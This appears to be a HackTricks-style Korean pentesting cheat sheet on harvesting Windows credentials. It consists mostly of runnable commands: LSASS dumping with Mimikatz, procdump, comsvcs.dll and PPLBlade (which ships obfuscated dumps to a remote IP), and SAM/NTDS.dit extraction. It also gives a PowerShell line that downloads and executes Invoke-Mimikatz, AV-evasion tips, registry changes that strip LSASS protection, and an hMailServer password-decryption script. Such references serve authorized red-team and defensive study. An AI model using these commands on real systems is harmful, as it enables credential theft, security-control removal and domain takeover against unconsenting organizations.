# Windows Credentials 탈취

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz가 수행할 수 있는 다른 항목을 확인하려면** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**여기에서 가능한 몇 가지 credentials 보호에 대해 알아보세요.**](credentials-protections.md) **이러한 보호는 Mimikatz가 일부 credentials를 추출하는 것을 방지할 수 있습니다.**

## Meterpreter로 Credentials

제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용해 피해자 내부에서 **passwords and hashes를 검색하세요.**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**이기 때문에 Defender에 의해 탐지되지 않습니다.\
이 도구를 사용하면 **dump the lsass process**, **download the dump** 그리고 덤프에서 **extract**하여 **credentials locally**를 얻을 수 있습니다.

또한 [SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
이 과정은 [SprayKatz](https://github.com/aas-n/spraykatz)로 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe to dump lsass.exe**의 사용을 **malicious**로 **detect**할 수 있습니다. 이는 그들이 **"procdump.exe" and "lsass.exe"** 문자열을 **detect**하기 때문입니다. 따라서 lsass.exe의 **PID**를 procdump에 **argument**로 **pass**하는 것이 **name lsass.exe**를 사용하는 것보다 더 **stealthier**합니다.

### Dumping lsass with **comsvcs.dll**

`C:\Windows\System32`에 있는 **comsvcs.dll**이라는 DLL은 충돌 발생 시 **프로세스 메모리 덤프**를 담당합니다. 이 DLL에는 `MiniDumpW`라는 **함수**가 포함되어 있으며, `rundll32.exe`를 사용해 호출되도록 설계되어 있습니다.\  
첫 두 인수는 중요하지 않으며, 세 번째 인수는 세 부분으로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 부분이고, 덤프 파일 위치가 두 번째 부분이며, 세 번째 부분은 엄격히 **full**이라는 단어입니다. 다른 옵션은 존재하지 않습니다.\  
이 세 부분을 파싱하면 DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 해당 파일로 전송합니다.\  
**comsvcs.dll**을 사용하면 lsass 프로세스를 덤프할 수 있으므로 procdump를 업로드하여 실행할 필요가 없습니다. 이 방법은 자세히 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)에 설명되어 있습니다.

다음 명령으로 실행합니다:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 과정을 자동화하려면** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **작업 관리자로 lsass 덤프하기**

1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 '작업 관리자'를 클릭합니다.
2. '자세히 보기'를 클릭합니다.
3. '프로세스' 탭에서 "Local Security Authority Process" 프로세스를 찾습니다.
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "Create dump file"을 클릭합니다.

### procdump로 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 은 Microsoft에서 서명한 바이너리로 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 제품군의 일부입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade로 lsass 덤핑

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 는 Protected Process Dumper 도구로, 메모리 덤프를 난독화하고 디스크에 기록하지 않고 원격 워크스테이션으로 전송하는 기능을 지원합니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender의 시그니처 기반 탐지를 회피하기 위한 메모리 덤프 파일 난독화
3. 디스크에 기록하지 않고 RAW 및 SMB 업로드 방식으로 메모리 덤프 전송(fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP 기반의 LSASS 덤핑 (MiniDumpWriteDump 없이)

Ink Dragon는 **LalsDumper**라는 3단계 덤퍼를 배포합니다. 이 덤퍼는 `MiniDumpWriteDump`를 전혀 호출하지 않으므로 해당 API에 대한 EDR 후크가 작동하지 않습니다:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`에서 소문자 `d` 32개로 구성된 플레이스홀더를 찾아 이를 `rtu.txt`의 절대 경로로 덮어쓰고, 패치된 DLL을 `nfdp.dll`로 저장한 뒤 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이렇게 하면 **LSASS**가 악성 DLL을 새로운 Security Support Provider (SSP)로 로드하게 됩니다.
2. **Stage 2 inside LSASS** – LSASS가 `nfdp.dll`을 로드하면, DLL은 `rtu.txt`를 읽고 각 바이트를 `0x20`으로 XOR한 다음 디코딩된 블롭을 메모리에 매핑한 뒤 제어를 전달합니다.
3. **Stage 3 dumper** – 매핑된 페이로드는 해시된 API 이름으로부터 해석된 **direct syscalls**를 사용해 MiniDump 로직을 재구현합니다 (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열어 압축된 LSASS 덤프를 파일로 스트리밍한 후 핸들을 닫아 이후에 exfiltration이 가능하게 합니다.

운영자 노트:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt`를 같은 디렉터리에 보관하세요. Stage 1이 하드코딩된 플레이스홀더를 `rtu.txt`의 절대 경로로 덮어쓰기 때문에 파일을 분리하면 체인이 끊깁니다.
* 등록은 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 `nfdp`를 추가하여 이뤄집니다. 해당 값을 직접 설정하면 LSASS가 부팅마다 SSP를 다시 로드하게 할 수 있습니다.
* `%TEMP%\*.ddt` 파일은 압축된 덤프입니다. 로컬에서 압축을 풀고 Mimikatz/Volatility에 공급하여 자격증명 추출을 진행하세요.
* `lals.exe` 실행에는 `AddSecurityPackageA` 호출이 성공하도록 admin/SeTcb 권한이 필요합니다. 호출이 반환되면 LSASS는 투명하게 악성 SSP를 로드하고 Stage 2를 실행합니다.
* 디스크에서 DLL을 삭제해도 LSASS 메모리에서는 제거되지 않습니다. 레지스트리 항목을 삭제하고 LSASS를 재시작(재부팅)하거나 장기간 지속성을 위해 그대로 둘 수 있습니다.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA 비밀 추출
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 타깃 DC에서 NTDS.dit의 비밀번호 히스토리 덤프
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 각 NTDS.dit 계정에 대한 pwdLastSet 속성 표시
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

이 파일들은 _C:\windows\system32\config\SAM_ 및 _C:\windows\system32\config\SYSTEM_에 **위치해 있어야 합니다**. 하지만 이 파일들은 보호되어 있어서 **일반적인 방법으로 단순히 복사할 수 없습니다**.

### 레지스트리에서

이 파일들을 얻는 가장 쉬운 방법은 레지스트리에서 복사본을 가져오는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
해당 파일들을 Kali 머신으로 **다운로드**한 다음, 다음을 사용하여 **해시를 추출**하세요:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

이 서비스를 사용하면 보호된 파일을 복사할 수 있습니다. 관리자 권한이 필요합니다.

#### vssadmin 사용

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**에서도 동일하게 할 수 있습니다. 다음은 **SAM file을 복사하는 방법**의 예입니다 (사용된 하드 드라이브는 "C:"이며 저장 위치는 C:\users\Public)이지만 이 방법은 어떤 보호된 파일을 복사할 때에도 사용할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
책에서 발췌한 코드: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

마지막으로 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용하여 SAM, SYSTEM 및 ntds.dit의 복사본을 만들 수 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 자격 증명 - NTDS.dit**

The **NTDS.dit** 파일은 **Active Directory**의 핵심으로 알려져 있으며, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보관합니다. 도메인 사용자의 **password hashes**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.

이 데이터베이스에는 세 가지 주요 테이블이 유지됩니다:

- **Data Table**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장하는 역할을 합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체의 **Security descriptors**가 여기에 저장되어 저장된 객체들의 보안 및 접근 제어를 보장합니다.

자세한 정보: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows는 _Ntdsa.dll_을 사용해 해당 파일과 상호작용하며, 이는 _lsass.exe_에 의해 사용됩니다. 따라서 **NTDS.dit** 파일의 **일부**는 **`lsass`** 메모리 안에 위치할 수 있습니다(성능 향상을 위해 **cache**를 사용하기 때문에 최근에 접근된 데이터를 찾을 수 있습니다).

#### NTDS.dit 내부의 해시 복호화

해시는 3단계로 암호화되어 있습니다:

1. **BOOTKEY**와 **RC4**를 사용해 Password Encryption Key (**PEK**)을 복호화합니다.
2. **PEK**와 **RC4**를 사용해 **hash**를 복호화합니다.
3. **DES**를 사용해 **hash**를 복호화합니다.

**PEK**는 **모든 domain controller**에서 **같은 값**을 가지지만, 도메인 컨트롤러의 **SYSTEM** 파일의 **BOOTKEY**를 사용해 **NTDS.dit** 파일 내에 암호화되어 있습니다(도메인 컨트롤러마다 다릅니다). 이 때문에 NTDS.dit 파일에서 자격 증명을 얻으려면 **NTDS.dit와 SYSTEM 파일**이 필요합니다 (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil을 사용한 NTDS.dit 복사

Windows Server 2008부터 사용 가능합니다.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
또한 [**volume shadow copy**](#stealing-sam-and-system) 트릭을 사용해 **ntds.dit** 파일을 복사할 수 있습니다. 또한 **SYSTEM file**의 사본도 필요하다는 점을 기억하세요(다시 말하지만, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) 트릭).

### **NTDS.dit에서 해시 추출**

파일 **NTDS.dit**과 **SYSTEM**을 **획득한 후**, _secretsdump.py_ 같은 도구를 사용해 **해시를 추출**할 수 있습니다:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
유효한 domain admin user를 사용하여 **자동으로 추출할 수도 있습니다:**
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **큰 NTDS.dit 파일**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 권장됩니다.

마지막으로, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`도 사용할 수 있습니다.

### **NTDS.dit에서 도메인 객체를 SQLite 데이터베이스로 추출하기**

NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하여 SQLite 데이터베이스로 추출할 수 있습니다. 이 도구는 secrets뿐만 아니라 전체 객체와 그 속성까지 추출하므로, 원본 NTDS.dit 파일을 이미 확보한 경우 추가 정보 추출에 유용합니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive는 선택 사항이지만 secrets 복호화(NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories)를 가능하게 합니다. 다른 정보와 함께 다음 데이터가 추출됩니다: user and machine accounts with their hashes, UAC flags, 마지막 logon 및 password change 타임스탬프, accounts description, names, UPN, SPN, groups 및 recursive memberships, organizational units tree 및 membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). 이 binary를 사용하여 여러 소프트웨어에서 credentials를 추출할 수 있습니다.
```
lazagne.exe all
```
## SAM 및 LSASS에서 자격 증명을 추출하는 기타 도구

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용될 수 있습니다. 다음에서 다운로드: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명을 추출합니다.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 credentials를 추출합니다
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## 유휴 RDP 세션 수집 및 보안 통제 약화

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory 스타일의 텔레메트리 수집

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`에 있는 모든 사용자 hive를 파싱합니다. 각 서브키는 서버 이름, `UsernameHint`, 마지막 쓰기 타임스탬프를 저장합니다. PowerShell로 FinalDraft의 로직을 재현할 수 있습니다:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그에서 Event ID **21** (성공적인 로그인) 및 **25** (disconnect)를 조회하여 누가 해당 호스트를 관리했는지 매핑합니다:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

어떤 Domain Admin이 정기적으로 연결하는지 알게 되면, 그들의 **disconnected** 세션이 아직 존재하는 동안 LSASS를 (LalsDumper/Mimikatz로) 덤프하세요. CredSSP + NTLM fallback은 검증자와 토큰을 LSASS에 남기며, 이는 SMB/WinRM을 통해 재생되어 `NTDS.dit`를 획득하거나 domain controllers에 persistence를 스테이징할 수 있습니다.

### FinalDraft가 표적한 레지스트리 다운그레이드

동일한 implant는 자격 증명 탈취를 용이하게 하기 위해 여러 레지스트리 키를 조작하기도 합니다:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1`로 설정하면 RDP 동안 전체 자격증명/티켓 재사용을 강제하여 pass-the-hash 스타일의 피벗을 가능하게 합니다.
* `LocalAccountTokenFilterPolicy=1`은 UAC 토큰 필터링을 비활성화하여 로컬 관리자가 네트워크를 통해 제한 없는 토큰을 얻도록 합니다.
* `DSRMAdminLogonBehavior=2`는 DC가 온라인 상태일 때 DSRM 관리자가 로그온할 수 있게 하여 공격자에게 또 다른 내장 고권한 계정을 제공합니다.
* `RunAsPPL=0`은 LSASS PPL 보호를 제거하여 LalsDumper와 같은 덤퍼가 메모리에 쉽게 접근할 수 있게 합니다.

## hMailServer database credentials (post-compromise)

hMailServer는 DB 비밀번호를 `[Database] Password=` 아래의 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`에 저장합니다. 해당 값은 Blowfish로 암호화되어 있으며 정적 키 `THIS_KEY_IS_NOT_SECRET`와 4바이트 워드 엔디언니스 스왑이 적용되어 있습니다. INI에 있는 16진수 문자열을 사용해 다음 Python 스니펫을 사용하세요:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
평문 비밀번호로 파일 잠금을 피하기 위해 SQL CE database를 복사하고, 32-bit provider를 로드한 다음 해시를 쿼리하기 전에 필요하면 업그레이드하세요:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 열은 hMailServer 해시 형식 (hashcat mode `1421`)을 사용합니다. Cracking these values는 WinRM/SSH pivots에 재사용 가능한 credentials를 제공할 수 있습니다.
## References

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
